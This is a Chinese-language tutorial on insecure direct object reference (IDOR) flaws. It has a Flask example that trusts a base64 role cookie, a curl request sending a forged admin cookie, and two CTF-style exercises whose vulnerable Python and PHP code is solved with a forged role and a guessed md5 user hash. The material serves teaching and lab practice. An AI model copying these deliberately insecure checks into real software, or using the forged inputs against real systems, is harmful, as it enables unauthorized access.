# 不安全的直接对象引用 (IDOR)

不安全的直接对象引用（Insecure Direct Object References，简称 `IDOR`）是一种漏洞，当攻击者能够通过操纵来访问或修改对象时，就会发生这种漏洞。该漏洞的产生是由于缺乏对用户输入的正确验证。如果攻击者能够控制一个未被应用程序正确验证且用于验证授权的值，则很可能会导致 `IDOR` 漏洞。

## 示例

想象以下 Python 代码。这段代码从 cookie 头部获取用户输入，并查找名为 `userdata` 的 cookie 参数。如果找到该参数，它会解码其中包含的 base64 值，并查找名为 `role` 的 JSON 键，该键包含用户的授权角色。

```python
userData = {}
userDataBase64 = request.cookies.get("userdata")
if (userDataBase64 is not None):
    try:
        # 将 JSON 数据转换为字典：
        userDataJSON = base64.b64decode(userDataBase64)
        userData = json.loads(userDataJSON)
    except:
        return render_template("index.html", result="Invalid user data")
    if userData["role"] is not None and userData["role"] == "admin":
        # 代码 ...
        return render_template("index.html", result=f"Admin dashboard")
return render_template("index.html", result=f"Not authorized to access this resource")
```

这段代码存在 `IDOR` 漏洞，因为它直接比较用户提供的数据中的值，而没有进行任何验证。这意味着攻击者可以通过修改 `userdata` cookie 参数内的值来创建自己的角色。

```bash
$ echo '{"role":"admin"}' | base64
eyJyb2xlIjoiYWRtaW4ifQo=
```

为了演示这一点，我们现在可以将这个 base64 值包含在我们的 `userdata` cookie 参数中，并使用 curl 向易受攻击的应用程序发送请求。

```bash
curl http://example.com/ -H 'Cookie: userdata=eyJyb2xlIjoiYWRtaW4ifQo='
```

这个带有我们自定义用户数据的 curl 请求将允许我们访问管理员仪表板。

### Basic Insecure direct object references (IDOR) in cookie 

Cookie中的基本不安全直接对象引用（IDOR） 

向应用程序发送JSON数据，并利用薄弱的角色验证流程获取标志。

setup code

```py
import os
os.chdir("/tmp/")

with open("flag.txt", "w") as f:
    f.write(flag)
```

code

```py
import json, base64

def adminDashboard(userDataBase64:str):
    userData = {}

    if ( userDataBase64 is not None ):
        try:
            # Make the JSON data into a dictonary:
            userDataJSON = base64.b64decode(userDataBase64)
            userData = json.loads(userDataJSON)
        except:
            return "Invalid user data"

        if userData.get("user") is None or userData.get("role") is None:
            return "Invalid cookie given"

        if userData["role"] is not None and userData["role"] == "admin":
            #Code ...
            return open("flag.txt", "r").read()

    return "Not authorized to access this resource"


jsonInput = "§输入§"
print( adminDashboard(jsonInput) )
```

WAF
- base64 编码

输入
```json
{
    "user": "wiener",
    "role": "admin"
}
```

### Basic IDOR with hash as user identifier

使用哈希作为用户标识符的基本IDOR 

从PHP代码中显示的 `users` 列表中，访问ID为`1`的 `admin` 用户。

setup code

```php
chdir('/tmp');
$jsonData = '
{
    "e00cf25ad42683b3df678c61f42c6bda": {
        "user": "admin",
        "secret": "'.$flag.'",
        "logged": true
    },
    "7cad999ac7b4a5e118d8e8970f30f5f3": {
        "user": "bart",
        "secret": "jd82Ald28lOgnq75Mq72K9",
        "logged": false
    }
}';

$f = fopen("files.json", "w");
fwrite($f, $jsonData);
fclose($f);

```

code

```php
<?php
chdir('/tmp');

# 拼接用户名与 id 构造 md5 hash
function makeHashID($username, $id) {
    return md5($username . $id);
}

// Take the hashid from the client
$hashId = urldecode("§输入§");

// Get all the logged in users
$users = json_decode(file_get_contents("files.json"), true);

if ( isset($users[$hashId]) == false ) {
    $hashId = makeHashID("guest", count($users));

    $users[$hashId] = [
        "user" => "guest",
        "secret" => "941Mehj2882Ksq2ltqG22u",
        "logged" => true
    ];
}

print_r($users[$hashId]);

?>
```

输入
- 空注入，得到新建信息
    - 输出
        ```log
        Array ( [user] => guest [secret] => 941Mehj2882Ksq2ltqG22u [logged] => 1 ) 
        ```

- 得到 [`admin1` 的 md5 hash](https://md5.gromweb.com/?string=admin1)
    `e00cf25ad42683b3df678c61f42c6bda`
